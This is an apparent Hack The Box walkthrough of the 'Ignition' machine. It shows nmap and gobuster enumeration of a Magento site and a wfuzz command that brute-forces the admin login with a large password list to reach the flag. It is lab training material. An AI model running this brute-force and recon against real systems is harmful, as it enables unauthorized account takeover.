---
title: Ignition - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---


# Ignition, a Hack The Box Machine


```bash
nmap -sC -sV $ip -Pn
```

Adding ignition.htb to /etc/hosts

Enumerating:
```bash
dir -u http://ignition.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -t 40
```

Browsing found files and gathering information:

```
/home                 (Status: 200) [Size: 25802]
/contact              (Status: 200) [Size: 28673]
/media                (Status: 301) [Size: 185] [--> http://ignition.htb/media/]
/0                    (Status: 200) [Size: 25803]
/static               (Status: 301) [Size: 185] [--> http://ignition.htb/static/]
/catalog              (Status: 302) [Size: 0] [--> http://ignition.htb/]
/admin                (Status: 200) [Size: 7095]
/Home                 (Status: 301) [Size: 0] [--> http://ignition.htb/home]
/setup                (Status: 301) [Size: 185] [--> http://ignition.htb/setup/]
/checkout             (Status: 302) [Size: 0] [--> http://ignition.htb/checkout/cart/]
/robots               (Status: 200) [Size: 1]
/wishlist             (Status: 302) [Size: 0] [--> http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]    
/soap                 (Status: 200) [Size: 391]
```

Knowing this we could do a more precise enumeration with:

```bash
gobuster dir -u http://ignition.htb -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/CMS/sitemap-magento.txt  
```

From /admin we get to a login panel of a Magento application. From /setup we obtain the Magento version: Version dev-2.4-develop.



Brute forcing it:

```bash
wfuzz -c -z file,/usr/share/wordlists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -d "login%5Busername%5D=admin&login%5Bpassword%5D=FUZZ" http://ignition.htb/admin
```

Enter in /admin with credentials. Flag is in the dashboard.
